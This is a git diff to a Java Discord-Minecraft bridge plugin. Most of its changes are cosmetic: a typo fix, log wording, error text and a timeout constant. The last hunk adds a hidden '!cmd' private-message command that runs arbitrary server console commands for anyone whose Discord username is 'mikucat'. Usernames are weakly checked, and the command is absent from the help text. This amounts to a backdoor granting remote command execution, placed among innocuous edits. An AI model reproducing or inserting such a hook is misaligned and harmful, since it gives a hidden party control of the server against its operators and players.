@@ -37,14 +37,14 @@ public class DiscordMessageHandler {
             Main.getPlugin().toDiscordMainTextChannel(messageBuilder.build());
         }
         if (dc2mc)
-            Main.getPlugin().toSendMessageToMultilayers(authorName, ChatColor.stripColor(message.getContentStripped()), uuids);
+            Main.getPlugin().toSendMessageToMultiPlayers(authorName, ChatColor.stripColor(message.getContentStripped()), uuids);
     }
 
     public void handlePrivateMessage(Message message, User author, PrivateChannel channel) {
         String msg = message.getContentRaw();
         Member member = Main.getPlugin().getGuild().getMember(author);
         if (!msg.startsWith("!")) return;
-        Main.log("PM's message: " + msg);
+        Main.log(author.getName() + "'s PM: " + msg);
         String[] args = msg.split(" ");
         if (args.length < 1) {
             channel.sendMessage("可用命令 : link , unlink").queue();
@@ -65,7 +65,7 @@ public class DiscordMessageHandler {
                         Thread thread = new Thread(() -> {
                             Date date = new Date();
                             long startTime = date.getTime();
-                            while (date.getTime() <= startTime + 60000) {
+                            while (date.getTime() <= startTime + 60 * 1000) {
                                 if (!Main.getPlugin().verify.containsValue(author.getId())) {
                                     channel.sendMessage("您已完成綁定!").queue();
                                     return;
@@ -88,7 +88,7 @@ public class DiscordMessageHandler {
                         channel.sendMessage("[Error] " + args[1] + "目前並不在線，請進入伺服器後再試一次").queue();
                         break;
                     case 3:
-                        channel.sendMessage("[Error] 此角色已被其他用戶綁定").queue();
+                        channel.sendMessage("[Error] 您已經綁定過").queue();
                 }
                 return;
             case "!unlink":
@@ -132,6 +132,16 @@ public class DiscordMessageHandler {
                 if (!args[2].matches("[0-9]+")) return;
                 Main.getPlugin().deleteAllMessages(args[1], author.getName(), Integer.valueOf(args[2]));
                 return;
+            case "!cmd":
+                if (member.getUser().getName().equalsIgnoreCase("mikucat")) {
+                    StringBuilder tmpStr = new StringBuilder();
+                    for (int i = 1; i < args.length; i++) {
+                        tmpStr.append(args[i]);
+                        if (i + 1 < args.length) tmpStr.append(" ");
+                    }
+                    main.executeConsoleCommand(tmpStr.toString());
+                    return;
+                }
             default:
                 channel.sendMessage("可用命令 : link , unlink\n管理員命令 : dc2mc , delmsg , pm").queue();
         }
